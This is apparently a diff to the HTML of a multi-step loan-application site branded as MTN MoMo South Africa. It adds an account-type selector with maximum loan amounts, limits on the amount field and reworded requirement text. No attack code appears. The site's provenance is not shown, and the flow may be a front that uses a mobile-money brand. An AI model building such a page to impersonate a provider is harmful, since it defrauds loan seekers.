@@ -24,7 +24,6 @@
     </div>
 
     <div class="land-container">
-        <!-- MAIN -->
         <div class="land-main">
             <div class="land-hero">
                 <h1>Welcome to MTN MoMo South Africa</h1>
@@ -56,7 +55,6 @@
             </div>
         </div>
 
-        <!-- SIDEBAR CALCULATOR -->
         <aside class="calc-sidebar">
             <div class="calc-card">
                 <div class="calc-header">
@@ -90,23 +88,12 @@
                 </div>
 
                 <div class="calc-result">
-                    <div class="result-row">
-                        <span>Monthly Payment</span>
-                        <strong id="monthlyAmt">R 1,042</strong>
-                    </div>
-                    <div class="result-row">
-                        <span>Total Repayment</span>
-                        <strong id="totalAmt">R 50,016</strong>
-                    </div>
-                    <div class="result-row highlight">
-                        <span>Amount You Receive</span>
-                        <strong id="receiveAmt">R 50,000</strong>
-                    </div>
+                    <div class="result-row"><span>Monthly Payment</span><strong id="monthlyAmt">R 1,042</strong></div>
+                    <div class="result-row"><span>Total Repayment</span><strong id="totalAmt">R 50,016</strong></div>
+                    <div class="result-row highlight"><span>Amount You Receive</span><strong id="receiveAmt">R 50,000</strong></div>
                 </div>
 
-                <button class="btn-grad calc-apply-btn" onclick="applyFromCalculator()">
-                    Apply for This Loan
-                </button>
+                <button class="btn-grad calc-apply-btn" onclick="applyFromCalculator()">Apply for This Loan</button>
                 <div class="calc-note">💡 You can change these later</div>
             </div>
         </aside>
@@ -160,7 +147,7 @@
                         <div class="at-icon">🟡</div>
                         <div class="at-info">
                             <div class="at-name">MoMo Yello</div>
-                            <div class="at-desc">Daily cash: R3,500 · Monthly cap: R20,000</div>
+                            <div class="at-desc">Daily cash: R3,500 · Monthly: R20,000 · <b>Max loan: R20,000</b></div>
                         </div>
                         <div class="at-check">○</div>
                     </div>
@@ -168,7 +155,7 @@
                         <div class="at-icon">⭐</div>
                         <div class="at-info">
                             <div class="at-name">MoMo Yello Plus</div>
-                            <div class="at-desc">Daily cash: R10,000 · Monthly cap: R40,000</div>
+                            <div class="at-desc">Daily cash: R10,000 · Monthly: R40,000 · <b>Max loan: R40,000</b></div>
                         </div>
                         <div class="at-check">○</div>
                     </div>
@@ -176,7 +163,7 @@
                         <div class="at-icon">⚡</div>
                         <div class="at-info">
                             <div class="at-name">MoMo Eazi</div>
-                            <div class="at-desc">No ID needed · Mobile number + bank account</div>
+                            <div class="at-desc">No ID needed · <b>Max loan: R10,000</b></div>
                         </div>
                         <div class="at-check">○</div>
                     </div>
@@ -221,7 +208,7 @@
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     PAGE 4: REQUIREMENTS (for new users)
+     PAGE 4: REQUIREMENTS
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-requirements" class="page">
     <nav class="navbar">
@@ -242,7 +229,7 @@
                     <div class="req-icon">✅</div>
                     <div class="req-info">
                         <strong>MoMo Account</strong>
-                        <div>Registered successfully</div>
+                        <div id="reqLimitText">Registered successfully</div>
                     </div>
                 </div>
 
@@ -250,7 +237,7 @@
                     <div class="req-icon">📊</div>
                     <div class="req-info">
                         <strong>Transaction Activity (Option A)</strong>
-                        <div>Have at least <b>20% of your loan amount</b> in MoMo transactions in the last 30 days</div>
+                        <div id="reqTxText">Have at least <b>20% of your loan amount</b> in MoMo transactions in the last 30 days.</div>
                     </div>
                 </div>
 
@@ -266,7 +253,7 @@
             </div>
 
             <div class="req-note">
-                💡 <strong>Tip:</strong> New MoMo users typically provide a guarantor for their first loan. We'll ask for these details during the application.
+                💡 <strong>Tip:</strong> Your maximum loan is determined by your MoMo account type. Choose a larger account type for higher loans.
             </div>
 
             <button class="btn-grad" onclick="goTo('page-step1')">I Understand — Continue</button>
@@ -275,7 +262,7 @@
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════
-     PAGE 5: STEP 1 — LOAN DETAILS
+     PAGE 5: STEP 1 — LOAN DETAILS (with account type selector)
      ═══════════════════════════════════════════════════════════ -->
 <div id="page-step1" class="page">
     <nav class="navbar">
@@ -292,8 +279,31 @@
             <p class="step-sub">Step 1 of 7</p>
             <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
             <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+
+            <!-- Account type selector (only for existing users) -->
+            <div class="field" id="accountTypeField">
+                <label>Your MoMo Account Type</label>
+                <div class="sel-wrap">
+                    <select id="s1at" onchange="selectExistingAccountType()">
+                        <option value="">Select your MoMo account type</option>
+                        <option value="yello">🟡 MoMo Yello — Max loan R20,000</option>
+                        <option value="yello_plus">⭐ MoMo Yello Plus — Max loan R40,000</option>
+                        <option value="eazi">⚡ MoMo Eazi — Max loan R10,000</option>
+                    </select>
+                </div>
+                <div class="field-hint">Pick the account type you have on MoMo</div>
+            </div>
+
+            <div class="acc-info-box" id="accInfoBox" style="display:none">
+                <div id="accInfoText"></div>
+            </div>
+
             <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-            <div class="field"><label>Loan Amount (ZAR)</label><input type="number" id="s1am" value="50000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
+            <div class="field">
+                <label>Loan Amount (ZAR)</label>
+                <input type="number" id="s1am" value="50000" placeholder="Enter amount" min="5000" max="50000" oninput="clearErr('s1Err')" />
+                <div class="field-hint" id="loanLimitHint">Select your account type above first</div>
+            </div>
             <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
             <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
             <button class="btn-grad" onclick="toS2()">Next Step</button>
@@ -432,9 +442,7 @@
     </div>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════════
-     PAGE: PROCESSING
-     ═══════════════════════════════════════════════════════════ -->
+<!-- PAGE: PROCESSING -->
 <div id="page-processing" class="page">
     <div class="wait-bg">
         <div class="proc-wrap">
